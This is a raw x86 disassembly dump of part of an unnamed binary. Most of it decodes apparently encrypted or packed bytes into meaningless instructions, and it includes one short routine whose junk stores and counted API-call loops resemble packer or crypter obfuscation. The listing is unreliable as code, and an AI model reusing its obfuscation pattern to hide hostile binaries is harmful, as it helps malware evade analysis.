  40d48c:	xor    DWORD PTR ds:0x66966d6c,eax
  40d492:	jp     0x40d4d9
  40d494:	pop    es
  40d495:	pop    ss
  40d496:	dec    edx
  40d497:	sub    ebx,esi
  40d499:	and    esp,DWORD PTR [eax+ebp*1-0x51]
  40d49d:	jmp    0x40d47b
  40d49f:	hlt    
  40d4a0:	push   0xc2f09216
  40d4a5:	lds    esi,FWORD PTR ds:0xf7c4a4f4
  40d4ab:	call   0x736e7c10
  40d4b0:	hlt    
  40d4b1:	xchg   DWORD PTR [ebp-0x4c967131],esi
  40d4b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4b8:	mov    bl,0x2b
  40d4ba:	pop    ebx
  40d4bb:	push   ecx
  40d4bc:	in     al,0x71
  40d4be:	stos   DWORD PTR es:[edi],eax
  40d4bf:	pop    ebx
  40d4c0:	and    ebx,esp
  40d4c2:	mov    cl,BYTE PTR [ebx+0x12]
  40d4c5:	ret    
  40d4c6:	lea    esp,[eax]
  40d4c8:	pusha  
  40d4c9:	mov    bl,0x94
  40d4cb:	push   ss
  40d4cc:	push   ecx
  40d4cd:	in     eax,dx
  40d4ce:	out    0x86,eax
  40d4d0:	and    BYTE PTR [ebx+0x39],dl
  40d4d3:	adc    ebp,0xffffffb3
  40d4d6:	stos   BYTE PTR es:[edi],al
  40d4d7:	retf   0x2fee
  40d4da:	add    BYTE PTR [edi+eiz*8+0x67db564],ah
  40d4e1:	sub    ecx,DWORD PTR [ecx]
  40d4e3:	in     al,dx
  40d4e4:	fild   WORD PTR [ecx]
  40d4e6:	mov    ds:0x619a31cb,al
  40d4eb:	xchg   DWORD PTR [ebp+0x78601969],eax
  40d4f1:	xor    BYTE PTR [edx+0x7c],ah
  40d4f4:	cld    
  40d4f5:	adc    al,0x77
  40d4f7:	(bad)  
  40d4f9:	mov    ds:0x12e96a11,eax
  40d4fe:	(bad)  
  40d500:	nop
  40d501:	sbb    eax,0xebb01fee
  40d506:	scas   al,BYTE PTR es:[edi]
  40d507:	xor    al,0x78
  40d509:	retf   
  40d50a:	pop    ebp
  40d50b:	mov    dh,0xbe
  40d50d:	sahf   
  40d50e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d50f:	dec    ebp
  40d510:	loope  0x40d552
  40d512:	test   eax,0xc9321ee
  40d517:	rcr    BYTE PTR [edx+0x64a46dd2],0x44
  40d51e:	push   ebx
  40d51f:	or     BYTE PTR ds:0xc51b1461,cl
  40d525:	inc    edi
  40d526:	xchg   edx,eax
  40d527:	imul   ecx,DWORD PTR [ebx-0x7e2f531e],0xffffffda
  40d52e:	int    0x3
  40d530:	(bad)  
  40d531:	loope  0x40d54e
  40d533:	cdq    
  40d534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d535:	mov    ah,0xd3
  40d537:	call   0x234d2448
  40d53c:	sub    ecx,DWORD PTR [esi]
  40d53e:	div    BYTE PTR [eax]
  40d540:	adc    edi,DWORD PTR [edx-0x35f57bab]
  40d546:	ffreep st(7)
  40d548:	stos   BYTE PTR es:[edi],al
  40d549:	or     DWORD PTR [eax],0x78e7da49
  40d54f:	les    edx,FWORD PTR [eax-0x2255caf9]
  40d555:	or     ch,BYTE PTR [eax]
  40d557:	sar    BYTE PTR [esi-0x72],1
  40d55a:	jns    0x40d556
  40d55c:	lods   al,BYTE PTR ds:[esi]
  40d55d:	push   ecx
  40d55f:	add    eax,0x96f19b42
  40d565:	xchg   esp,eax
  40d566:	leavew 
  40d568:	sbb    DWORD PTR ds:0x32a4a9d6,eax
  40d56e:	push   edi
  40d56f:	and    DWORD PTR [eax-0x10],eax
  40d572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d573:	pop    esp
  40d574:	xlat   BYTE PTR ds:[ebx]
  40d575:	push   ecx
  40d576:	out    0x76,al
  40d578:	cmp    bl,BYTE PTR [esi]
  40d57a:	jns    0x40d549
  40d57c:	mov    ds:0x682e9025,eax
  40d581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d582:	aad    0x62
  40d584:	and    al,0xfd
  40d586:	aaa    
  40d587:	lock test al,0xca
  40d58a:	inc    ebx
  40d58b:	add    ebx,DWORD PTR [edx+ebx*1]
  40d58e:	dec    ebx
  40d58f:	xor    edx,edx
  40d591:	add    DWORD PTR [ebp-0xc],ebx
  40d594:	pop    ebx
  40d595:	mov    eax,DWORD PTR [ebp-0xc]
  40d598:	pop    edi
  40d599:	pop    esi
  40d59a:	pop    ebx
  40d59b:	leave  
  40d59c:	ret    0x10
  40d59f:	push   ebp
  40d5a0:	mov    ebp,esp
  40d5a2:	push   ecx
  40d5a3:	not    eax
  40d5a5:	push   ecx
  40d5a6:	mov    eax,0xf89c8532
  40d5ab:	mov    DWORD PTR ds:0x4337a3,ecx
  40d5b1:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40d5b8:	mov    DWORD PTR ds:0x433797,edx
  40d5be:	push   esi
  40d5bf:	mov    DWORD PTR ds:0x43379b,0x1f1b
  40d5c9:	mov    DWORD PTR [ebp-0x8],eax
  40d5cc:	mov    DWORD PTR ds:0x4337a7,0x659
  40d5d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5d9:	push   edi
  40d5da:	not    edi
  40d5dc:	mov    edi,0x7510854
  40d5e1:	not    DWORD PTR ds:0x4337e3
  40d5e7:	mov    esi,0x32729b
  40d5ec:	mov    DWORD PTR ds:0x43379b,0x27d6
  40d5f6:	cmp    ecx,eax
  40d5f8:	mov    DWORD PTR ds:0x433827,0x52ab
  40d602:	je     0x40d94e
  40d608:	mov    eax,DWORD PTR [ebp-0x4]
  40d60b:	mov    ecx,DWORD PTR [ebp+0xc]
  40d60e:	sub    DWORD PTR ds:0x43382f,0x32
  40d618:	xor    eax,edi
  40d61a:	add    eax,esi
  40d61c:	mov    DWORD PTR ds:0x43375b,0x51fb
  40d626:	cmp    eax,ecx
  40d628:	mov    DWORD PTR ds:0x4337db,0x5a
  40d632:	je     0x40d94e
  40d638:	and    DWORD PTR ds:0x433817,0x0
  40d642:	mov    edx,DWORD PTR ds:0x433817
  40d648:	inc    edx
  40d649:	mov    DWORD PTR ds:0x433817,edx
  40d64f:	cmp    DWORD PTR ds:0x433817,0x25
  40d656:	jne    0x40d665
  40d65c:	push   DWORD PTR [ebp-0xc]
  40d65f:	call   DWORD PTR ds:0x4122a8
  40d665:	cmp    DWORD PTR ds:0x433817,0x18
  40d66c:	jb     0x40d642
  40d672:	and    DWORD PTR ds:0x433763,0x0
  40d67c:	xor    edx,edx
  40d67e:	add    edx,DWORD PTR ds:0x433763
  40d684:	inc    edx
  40d685:	mov    DWORD PTR ds:0x433763,edx
  40d68b:	cmp    DWORD PTR ds:0x433763,0x1c
  40d692:	jne    0x40d6a3
  40d698:	push   0x433853
  40d69d:	call   DWORD PTR ds:0x412360
  40d6a3:	cmp    DWORD PTR ds:0x433763,0x1b
  40d6aa:	jb     0x40d67c
  40d6b0:	movzx  eax,BYTE PTR ds:0x433767
  40d6b7:	add    eax,DWORD PTR ds:0x43379b
  40d6bd:	mov    ds:0x433767,eax
  40d6c2:	mov    eax,DWORD PTR [ebp-0x4]
  40d6c5:	xor    eax,edi
  40d6c7:	add    eax,esi
  40d6c9:	push   eax
  40d6ca:	push   DWORD PTR [ebp-0x8]
  40d6cd:	push   DWORD PTR [ebp-0x4]
  40d6d0:	mov    edx,DWORD PTR ds:0x413b34
  40d6d6:	call   0x4057b9
  40d6db:	mov    ecx,DWORD PTR ds:0x413b34
  40d6e1:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40d6e7:	jmp    0x40d944
  40d6ec:	mov    esi,0x704a1816
  40d6f1:	jo     0x40d75f
  40d6f3:	adc    al,BYTE PTR ds:0x57a0482a
  40d6f9:	sbb    ecx,esp
  40d6fb:	cmc    
  40d6fc:	jp     0x40d690
  40d6fe:	jle    0x40d77e
  40d700:	ds jl  0x40d781
  40d703:	jle    0x40d75b
  40d705:	mov    al,ds:0x3c5af6b8
  40d70a:	ja     0x40d6bd
  40d70c:	loope  0x40d701
  40d70e:	and    BYTE PTR ds:0xc3905b02,ch
  40d714:	sbb    BYTE PTR [edx-0x4a],0x70
  40d718:	cld    
  40d719:	clc    
  40d71a:	loope  0x40d71e
  40d71c:	adc    dl,BYTE PTR [ebp-0x5bb50d09]
  40d722:	push   es
  40d723:	xchg   esp,eax
  40d724:	mov    cl,0x87
  40d726:	jmp    0x40d755
  40d728:	mov    esi,0x104371e2
  40d72d:	jecxz  0x40d6fd
  40d72f:	mov    eax,ds:0xaf2762bf
  40d734:	repnz pop es
  40d736:	bound  eax,QWORD PTR [esp+edx*4]
  40d739:	test   BYTE PTR [ecx+ecx*8+0x1c472c02],bh
  40d740:	ins    DWORD PTR es:[edi],dx
  40d741:	add    cl,BYTE PTR [edi+0x59]
  40d744:	cmp    BYTE PTR [edx+0x20eb7f3f],ah
  40d74a:	adc    BYTE PTR [ecx],cl
  40d74c:	pop    esi
  40d74d:	adc    BYTE PTR [ebx+0x4fba934e],dh
  40d753:	sahf   
  40d754:	ret    
  40d755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d756:	mov    ds:0xe18cc323,al
  40d75b:	ror    BYTE PTR [esi],cl
  40d75d:	sbb    dh,BYTE PTR [ebx]
  40d75f:	sub    DWORD PTR ds:0x91a4769b,edx
  40d765:	cdq    
  40d766:	inc    eax
  40d767:	jle    0x40d796
  40d769:	lock cmp eax,0x65514a35
  40d76f:	sbb    ah,ah
  40d771:	inc    esp
  40d772:	push   edi
  40d773:	mov    cl,0xb3
  40d775:	aam    0xd4
  40d777:	fistp  QWORD PTR ds:0x7737e82e
  40d77d:	std    
  40d77e:	push   0x1596a9c0
  40d783:	jno    0x40d720
  40d785:	cmp    bh,BYTE PTR [ecx+0x2]
  40d788:	aam    0x70
  40d78a:	fwait
  40d78b:	neg    cl
  40d78d:	(bad)  
  40d78e:	fistp  DWORD PTR [ebp-0x7448ec1]
  40d794:	jbe    0x40d7a5
  40d796:	mov    dl,0x5e
  40d798:	stos   DWORD PTR es:[edi],eax
  40d799:	pop    eax
  40d79a:	and    DWORD PTR [esi],0xf415ae93
  40d7a0:	shl    BYTE PTR [ebx],0x86
  40d7a3:	scas   al,BYTE PTR es:[edi]
  40d7a4:	add    dl,ch
  40d7a6:	repz xor al,ch
  40d7a9:	push   eax
  40d7aa:	mov    esi,0xe354c190
  40d7af:	jmp    0x40d829
  40d7b1:	(bad)  
  40d7b2:	(bad)  
  40d7b4:	call   0xe23fb1c9
  40d7b9:	fist   DWORD PTR [edx]
  40d7bb:	iret   
  40d7bc:	sahf   
  40d7bd:	xor    al,0x3e
  40d7bf:	shl    esi,0x4d
  40d7c2:	mov    cl,dh
  40d7c4:	neg    eax
  40d7c6:	mov    ah,0x1
  40d7c8:	add    eax,0x6c27634e
  40d7cd:	sbb    ebx,ecx
  40d7cf:	cs mov dl,0x7e
  40d7d2:	dec    esi
  40d7d3:	scas   al,BYTE PTR es:[edi]
  40d7d4:	repz int3 
  40d7d6:	push   esi
  40d7d7:	ja     0x40d78b
  40d7d9:	cs push ebp
  40d7db:	aad    0xf4
  40d7dd:	lahf   
  40d7de:	dec    esp
  40d7df:	jnp    0x40d7bf
  40d7e1:	sbb    al,0x38
  40d7e3:	mov    al,ds:0x5e5557e8
  40d7e8:	jb     0x40d76a
  40d7ea:	les    eax,FWORD PTR [esi-0x7b]
  40d7ed:	stos   DWORD PTR es:[edi],eax
  40d7ee:	jns    0x40d778
  40d7f0:	mov    dh,0xac
  40d7f2:	(bad)  [edi]
  40d7f4:	inc    ebp
  40d7f5:	sahf   
  40d7f6:	mov    bh,0x7e
  40d7f8:	and    esi,DWORD PTR [esi]
  40d7fa:	sbb    BYTE PTR [ebx+0x49],al
  40d7fd:	sbb    edx,DWORD PTR [ebx+edi*8+0x47]
  40d801:	push   ss
  40d802:	dec    edi
  40d803:	and    edi,DWORD PTR [ecx-0x7e]
  40d806:	xchg   ecx,eax
  40d807:	(bad)  
  40d808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d809:	jmp    0x39fe7eb9
  40d80e:	sar    eax,1
  40d810:	push   ecx
  40d811:	adc    al,0x86
  40d813:	xor    BYTE PTR [ebx+0x54],dl
  40d816:	mov    esi,0xfc3cc3c8
  40d81b:	sbb    al,BYTE PTR [ebp+0x6bc3aa7f]
  40d821:	mov    dh,0x19
  40d823:	scas   al,BYTE PTR es:[edi]
  40d824:	hlt    
  40d825:	(bad)  
  40d826:	mov    eax,0x49c11df7
  40d82b:	pop    es
  40d82c:	xor    al,0xb
  40d82e:	push   edi
  40d82f:	add    BYTE PTR [edi-0x46588a43],dh
  40d835:	sahf   
  40d836:	add    eax,0xa0ea06fa
  40d83b:	push   ss
  40d83c:	cmc    
  40d83d:	or     esi,DWORD PTR [edx+0x2e870311]
  40d843:	cmc    
  40d844:	or     DWORD PTR [edx],esi
  40d846:	call   0x6a1ce0ae
  40d84b:	pop    esi
  40d84c:	ins    DWORD PTR es:[edi],dx
  40d84d:	cmp    al,0x64
  40d84f:	mov    eax,edi
  40d851:	lock push 0xe4a4305b
  40d857:	lds    esp,FWORD PTR [edx]
  40d859:	jo     0x40d883
  40d85b:	xchg   DWORD PTR [edx+0x2294a380],edi
  40d861:	pop    esp
  40d862:	out    0x3d,al
  40d864:	test   DWORD PTR [ebx+0x284d124b],edx
  40d86a:	fist   DWORD PTR ds:0x6dbca16d
  40d870:	aaa    
  40d871:	mov    sp,si
  40d874:	test   al,0x9a
  40d876:	dec    ecx
  40d877:	jp     0x40d8f2
  40d879:	out    0xe3,eax
  40d87b:	jne    0x40d8f0
  40d87d:	int    0xd5
  40d87f:	cmp    dl,BYTE PTR [edx-0x3d]
  40d882:	jbe    0x40d853
  40d884:	fidiv  DWORD PTR [esi+0x33968cc]
  40d88a:	dec    eax
  40d88b:	jge    0x40d8ef
  40d88d:	push   es
  40d88e:	rol    BYTE PTR [eax-0x42],0xce
  40d892:	ret    
  40d893:	popf   
  40d894:	popa   
  40d895:	and    eax,0x2a3f6739
  40d89a:	lea    ebp,[ebx]
  40d89c:	jmp    0x40d83e
  40d89e:	in     eax,0x77
  40d8a0:	cmp    DWORD PTR [ebx],edx
  40d8a2:	cwde   
  40d8a3:	add    al,0xd9
  40d8a5:	sbb    eax,0x59b2f6e2
  40d8aa:	out    dx,al
  40d8ab:	mov    eax,ds:0x1d8a4318
  40d8b0:	(bad)  
  40d8b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8b2:	adc    ebx,0xfffffff4
  40d8b5:	mov    ebx,0xcbf9f26b
  40d8ba:	mov    edi,0x39d242c6
  40d8bf:	cmp    DWORD PTR [esp+edx*4],eax
  40d8c2:	mov    ss,WORD PTR [ebx-0x1d8f4234]
  40d8c8:	scas   al,BYTE PTR es:[edi]
  40d8c9:	test   al,0x18
  40d8cb:	inc    edi
  40d8cc:	xchg   ecx,eax
  40d8cd:	test   al,0xb
  40d8cf:	imul   esi,DWORD PTR [edi+edi*8],0x6bb7efba
  40d8d6:	dec    esp
  40d8d7:	add    ebp,DWORD PTR [edi-0x71]
  40d8da:	adc    BYTE PTR [ebp-0x6],ch
  40d8dd:	ret    0x79f8
  40d8e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8e1:	xor    al,0xd3
  40d8e3:	inc    edi
  40d8e4:	lds    edx,FWORD PTR [ebp-0x7e]
  40d8e7:	or     eax,0x65251f4e
  40d8ec:	jge    0x40d872
  40d8ee:	inc    ebp
  40d8ef:	clc    
  40d8f0:	sub    al,0x8e
  40d8f2:	xor    eax,0x41ba004e
  40d8f7:	addr16 push cs
  40d8f9:	cwde   
  40d8fa:	or     BYTE PTR [eax],al
  40d8fc:	ins    DWORD PTR es:[edi],dx
  40d8fd:	call   FWORD PTR [edi-0x65fcc6ab]
  40d903:	inc    ecx
  40d904:	dec    esp
  40d905:	pop    ebp
  40d906:	jb     0x40d88c
  40d908:	cmp    eax,0x2185817e
  40d90d:	pop    es
  40d90e:	or     ah,BYTE PTR ds:0x33d226ba
  40d914:	(bad)  
  40d916:	stos   DWORD PTR es:[edi],eax
  40d917:	mov    bh,BYTE PTR [ebp-0x477bdd4c]
  40d91d:	sbb    BYTE PTR [ecx+ebp*1+0x44],0x58
  40d922:	imul   ebx,DWORD PTR [ebx+edi*4+0x60],0xf010c612
  40d92a:	sub    DWORD PTR [edi],eax
  40d92c:	push   ds
  40d92d:	cdq    
  40d92e:	mov    edi,0xbb9e3224
  40d933:	(bad)  
  40d934:	xor    DWORD PTR [ebp-0x63],eax
  40d937:	sbb    DWORD PTR [eax+edi*1-0x9],0x11b0d9f0
  40d93f:	(bad)  
  40d940:	loopne 0x40d955
  40d942:	jp     0x40d90e
  40d944:	mov    DWORD PTR [ecx],eax
  40d946:	mov    eax,DWORD PTR [ebp-0x8]
  40d949:	jmp    0x40de40
  40d94e:	mov    eax,DWORD PTR [ebp-0x4]
  40d951:	mov    ecx,DWORD PTR [ebp+0x10]
  40d954:	xor    eax,edi
  40d956:	add    eax,esi
  40d958:	jmp    0x40dbb5
  40d95d:	or     DWORD PTR [ebx+0x1f],0x4172f5e2
  40d964:	imul   ebx,DWORD PTR [ecx],0x992b51ed
  40d96a:	ret    0x9b19
  40d96d:	cmp    dl,BYTE PTR [eax+0x7c3e7e7e]
  40d973:	jle    0x40d9f3
  40d975:	pop    ebx
  40d976:	push   esp
  40d977:	xchg   edi,eax
  40d978:	inc    edi
  40d979:	dec    eax
  40d97a:	(bad)  
  40d97b:	sub    bl,BYTE PTR [esi+0x0]
  40d97e:	dec    esp
  40d97f:	in     al,dx
  40d980:	pop    ss
  40d981:	add    al,0x3a
  40d983:	mov    bl,0x2e
  40d985:	popf   
  40d986:	inc    ecx
  40d987:	out    0x55,al
  40d989:	ret    0xa271
  40d98c:	adc    esi,DWORD PTR [edx]
  40d98e:	sahf   
  40d98f:	stos   DWORD PTR es:[edi],eax
  40d990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d991:	sbb    eax,0x5039774a
  40d996:	push   esi
  40d997:	jmp    0xfab3:0xc23477a9
  40d99e:	fsub   QWORD PTR [edi-0xb]
  40d9a1:	ficom  WORD PTR [esi]
  40d9a3:	rol    ch,0x19
  40d9a6:	cmp    al,0x3c
  40d9a8:	dec    esi
  40d9a9:	iret   
  40d9aa:	dec    esp
  40d9ab:	std    
  40d9ac:	add    BYTE PTR [esi+0x45],ch
  40d9af:	call   0xc13779d9
  40d9b4:	outs   dx,DWORD PTR ds:[esi]
  40d9b5:	fs push edi
  40d9b7:	sub    dh,BYTE PTR [edx+edi*2+0x57]
  40d9bb:	in     al,0xd4
  40d9bd:	dec    ecx
  40d9be:	jg     0x40d9e0
  40d9c0:	cmp    al,BYTE PTR cs:[ebp+0x37a410da]
  40d9c7:	jecxz  0x40d9af
  40d9c9:	out    dx,eax
  40d9ca:	sahf   
  40d9cb:	cwde   
  40d9cc:	fxam   
  40d9ce:	jecxz  0x40d95d
  40d9d0:	call   0x910d:0xd6326dad
  40d9d7:	repz jnp 0x40d9ed
  40d9da:	mov    ds:0x61c73a49,eax
  40d9df:	xchg   edx,eax
  40d9e0:	pop    ebx
  40d9e1:	dec    ecx
  40d9e2:	cli    
  40d9e3:	adc    esp,DWORD PTR [ebx+0x42]
  40d9e6:	xor    cl,cl
  40d9e8:	mov    eax,DWORD PTR [esi+0x5b3eb937]
  40d9ee:	mov    ds:0x587de18d,al
  40d9f3:	sub    eax,0xaf363ca0
  40d9f8:	mov    WORD PTR [ebp+0x49057fc7],cs
  40d9fe:	or     edi,esp
  40da00:	push   es
  40da01:	neg    BYTE PTR [eax+ebp*8-0x36]
  40da05:	add    DWORD PTR [ebx],0x74
  40da08:	mov    ds:0xa4b72679,eax
  40da0d:	push   0xbf819c94
  40da12:	les    edx,FWORD PTR [ebp-0x3c972cd]
  40da18:	push   esp
  40da19:	mov    ds:0x24fc0c87,eax
  40da1e:	(bad)  
  40da1f:	push   ds
  40da20:	test   ecx,0x2ccea31c
  40da26:	pop    esi
  40da27:	retf   0x343c
  40da2a:	repz (bad) 
  40da2c:	(bad)  
  40da2d:	cmc    
  40da2e:	ss push eax
  40da30:	and    BYTE PTR [ecx+0x357d4e8f],0xa4
  40da37:	push   edx
  40da38:	mov    bl,0x6
  40da3a:	test   eax,0x6be8d7e7
  40da3f:	mov    esp,0x92bf36d
  40da44:	test   DWORD PTR [esi+0x79],edx
  40da47:	and    cl,BYTE PTR [ecx]
  40da49:	or     esp,DWORD PTR [edx-0x57]
  40da4c:	jnp    0x40d9fa
  40da4e:	adc    DWORD PTR [eax-0x25f8ccea],0x1e
  40da55:	pop    ebx
  40da56:	mov    al,0xe0
  40da58:	inc    edi
  40da59:	lahf   
  40da5a:	dec    esp
  40da5b:	hlt    
  40da5c:	scas   eax,DWORD PTR es:[edi]
  40da5d:	adc    dh,BYTE PTR [esi-0x30]
  40da60:	add    al,0xcd
  40da62:	inc    eax
  40da63:	pop    edi
  40da64:	sbb    al,0x48
  40da66:	fadd   QWORD PTR [edi+0x6115b8e4]
  40da6c:	mov    dh,0xfd
  40da6e:	push   eax
  40da6f:	mov    ecx,0x60c442d4
  40da74:	dec    ebx
  40da75:	test   eax,0x72be5c69
  40da7a:	daa    
  40da7b:	lea    edi,[ecx-0xde412a]
  40da81:	dec    edi
  40da82:	(bad)  
  40da83:	shr    BYTE PTR [ebp+ecx*2+0x73],1
  40da87:	adc    BYTE PTR [edx-0x2d7194dc],ch
  40da8d:	das    
  40da8e:	mov    al,0x9d
  40da90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da91:	aaa    
  40da92:	pop    ecx
  40da93:	push   edx
  40da94:	in     eax,dx
  40da95:	lods   al,BYTE PTR ds:[esi]
  40da96:	mov    al,ds:0xce2a9266
  40da9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da9c:	std    
  40da9d:	jle    0x40dae4
  40da9f:	jl     0x40da72
  40daa1:	inc    ebx
  40daa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa3:	mov    edi,0x2a6d6fff
  40daa8:	int    0x9a
  40daaa:	das    
  40daab:	data16 xchg dh,ah
  40daae:	jecxz  0x40dac9
  40dab0:	sti    
  40dab1:	add    cl,BYTE PTR [esi-0x7d]
  40dab4:	test   DWORD PTR [ebp+edi*8-0x3c5b2bf9],esi
  40dabb:	mov    esp,0x780a0b13
  40dac0:	xor    dl,ch
  40dac2:	sub    ecx,edi
  40dac4:	sub    BYTE PTR [ebx+0x0],ch
  40dac7:	dec    edx
  40dac8:	adc    ebp,DWORD PTR [ecx]
  40daca:	mov    ch,0x67
  40dacc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dacd:	and    eax,0x83e289c4
  40dad2:	fcom   st(3)
  40dad4:	pushf  
  40dad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dad6:	loop   0x40daa6
  40dad8:	test   eax,0x54fa3dd4
  40dadd:	mov    esi,0x15474d0a
  40dae2:	mov    esp,0xab16ec31
  40dae7:	jmp    0x40db1d
  40dae9:	xchg   ecx,eax
  40daea:	fcom   DWORD PTR [esi+0x1a]
  40daed:	dec    ebx
  40daee:	mov    esi,0xdf563c15
  40daf3:	jp     0x40db6a
  40daf5:	rol    BYTE PTR [edx+0x59],1
  40daf8:	dec    esp
  40daf9:	mov    edx,0x63f04014
  40dafe:	clc    
  40daff:	popf   
  40db00:	push   cs
  40db01:	enter  0x35f4,0x7a
  40db05:	push   ebp
  40db06:	idiv   BYTE PTR [edi-0x6e]
  40db09:	imul   ebx,DWORD PTR [edx],0xb8cae154
  40db0f:	(bad)  
  40db10:	js     0x40db20
  40db12:	xor    DWORD PTR [esp+esi*8+0x1a],0xa0746e25
  40db1a:	rol    DWORD PTR [edi+0x65],1
  40db1d:	mov    esi,0x1d2acc6e
  40db22:	dec    esp
  40db23:	fmulp  st(0),st
  40db25:	jecxz  0x40db10
  40db27:	fwait
  40db28:	push   ebp
  40db29:	mov    edi,0xcfd8d31f
  40db2e:	and    eax,0xf0f14e22
  40db33:	ss mov dl,0x66
  40db36:	mov    BYTE PTR [ecx+0x2569e293],0x35
  40db3d:	mov    ebp,0x4451ab5b
  40db42:	(bad)  
  40db43:	cmp    al,0xbf
  40db45:	sub    edi,esi
  40db47:	cwde   
  40db48:	pop    ds
  40db49:	mov    bh,0xb0
  40db4b:	gs fsubrp st(2),st
  40db4e:	adc    eax,0xb39941b
  40db53:	fwait
  40db54:	ins    BYTE PTR es:[edi],dx
  40db55:	dec    eax
  40db56:	push   ebp
  40db57:	pop    ecx
  40db58:	push   ds
  40db59:	adc    BYTE PTR [edx-0x32],ch
  40db5c:	jp     0x40dbbf
  40db5e:	sub    BYTE PTR [eax-0x43],ch
  40db61:	sub    eax,0xf0f69805
  40db66:	push   es
  40db67:	outs   dx,BYTE PTR ds:[esi]
  40db68:	xor    al,0x8
  40db6a:	add    BYTE PTR [ecx],al
  40db6c:	xor    edi,ebp
  40db6e:	or     DWORD PTR [edi+0x4609bc5f],edi
  40db74:	stc    
  40db75:	add    al,0xc4
  40db77:	add    eax,0x741e2e4d
  40db7c:	xor    edi,edi
  40db7e:	inc    edi
  40db7f:	push   ecx
  40db80:	mov    esi,0x3e7b41b2
  40db85:	loop   0x40dbe5
  40db87:	jg     0x40dbf9
  40db89:	cwde   
  40db8a:	push   ebx
  40db8b:	call   0xe5536780
  40db90:	or     BYTE PTR [edx+0x107fff86],dl
  40db96:	std    
  40db97:	and    eax,0x584b99ec
  40db9c:	nop
  40db9d:	and    BYTE PTR [ecx+esi*4-0x34177e59],cl
  40dba4:	xchg   esp,eax
  40dba5:	ins    DWORD PTR es:[edi],dx
  40dba6:	adc    cl,BYTE PTR [ebx-0x26223195]
  40dbac:	push   es
  40dbad:	pop    ecx
  40dbae:	je     0x40dbde
  40dbb0:	push   ebp
  40dbb1:	shr    BYTE PTR [ebx],cl
  40dbb3:	scas   al,BYTE PTR es:[edi]
  40dbb4:	fistp  QWORD PTR [ebx]
  40dbb6:	ror    DWORD PTR [edi],0x85
  40dbb9:	add    BYTE PTR [edx],0x0
  40dbbc:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi+0x2e40145c],0xfaffc789
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dba8
  40dbe0:	inc    ebx
  40dbe1:	sar    cl,0x3c
  40dbe4:	dec    ebx
  40dbe5:	out    0x5b,eax
  40dbe7:	xor    DWORD PTR [edx+edi*4-0x75],esi
  40dbeb:	mov    ss,WORD PTR ds:[ecx+ecx*8]
  40dbef:	fild   DWORD PTR [ebx+0x40dd922]
  40dbf5:	(bad)  
  40dbf6:	jmp    0x3d981a47
  40dbfb:	adc    cl,dh
  40dbfd:	test   BYTE PTR [ebx-0x5c],ch
  40dc00:	xchg   ecx,eax
  40dc01:	cmp    DWORD PTR [esi],ecx
  40dc03:	sbb    DWORD PTR [edi-0x656b03df],ebp
  40dc09:	lahf   
  40dc0a:	adc    BYTE PTR [ecx+0x20],ah
  40dc0d:	imul   BYTE PTR [ebp+0x6458352]
  40dc13:	xchg   edx,eax
  40dc14:	add    al,0x5d
  40dc16:	sahf   
  40dc17:	add    eax,DWORD PTR [edx]
  40dc19:	test   BYTE PTR [ebx-0xd617574],0x59
  40dc20:	aas    
  40dc21:	mov    esp,0x47c89e67
  40dc26:	push   eax
  40dc27:	add    edx,DWORD PTR [ebx+0x40]
  40dc2a:	add    eax,0x1226f1ba
  40dc2f:	xor    eax,DWORD PTR [ebp+0x2d73e450]
  40dc35:	xchg   ebx,eax
  40dc36:	aad    0x73
  40dc38:	stos   DWORD PTR es:[edi],eax
  40dc39:	aas    
  40dc3a:	jno    0x40dbd3
  40dc3c:	mov    eax,es
  40dc3e:	mov    BYTE PTR [ecx],al
  40dc40:	push   ss
  40dc41:	mov    ds:0x27be9c25,eax
  40dc46:	xchg   edi,eax
  40dc47:	jg     0x40dc5d
  40dc49:	mov    bl,0xd7
  40dc4b:	inc    ebx
  40dc4c:	mov    edi,?
  40dc4e:	xor    eax,edx
  40dc50:	loop   0x40dbe9
  40dc52:	cmp    BYTE PTR [ecx],0x2c
  40dc55:	or     BYTE PTR [eax-0x1d9d88a7],0xc5
  40dc5c:	dec    ecx
  40dc5d:	outs   dx,DWORD PTR ds:[esi]
  40dc5e:	xchg   ecx,eax
  40dc5f:	mul    BYTE PTR [esi+0x5ceb5ac5]
  40dc65:	imul   DWORD PTR [ebp-0x44]
  40dc68:	pop    ebp
  40dc69:	pop    ss
  40dc6a:	fwait
  40dc6b:	mov    ebp,0x41f0a824
  40dc70:	dec    edi
  40dc71:	rol    BYTE PTR [edi],1
  40dc73:	dec    eax
  40dc74:	sbb    al,0xf4
  40dc76:	scas   al,BYTE PTR es:[edi]
  40dc77:	dec    ebp
  40dc78:	mov    WORD PTR [ebx-0x4281aa73],cs
  40dc7e:	int3   
  40dc7f:	sub    eax,0xe284482e
  40dc84:	mov    al,ds:0xe4377b7b
  40dc89:	or     dh,al
  40dc8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc8c:	daa    
  40dc8d:	jae    0x40dc6a
  40dc8f:	push   es
  40dc90:	xchg   ebx,eax
  40dc91:	push   esi
  40dc92:	adc    al,0x20
  40dc94:	mov    BYTE PTR [esi-0x54596f0f],dl
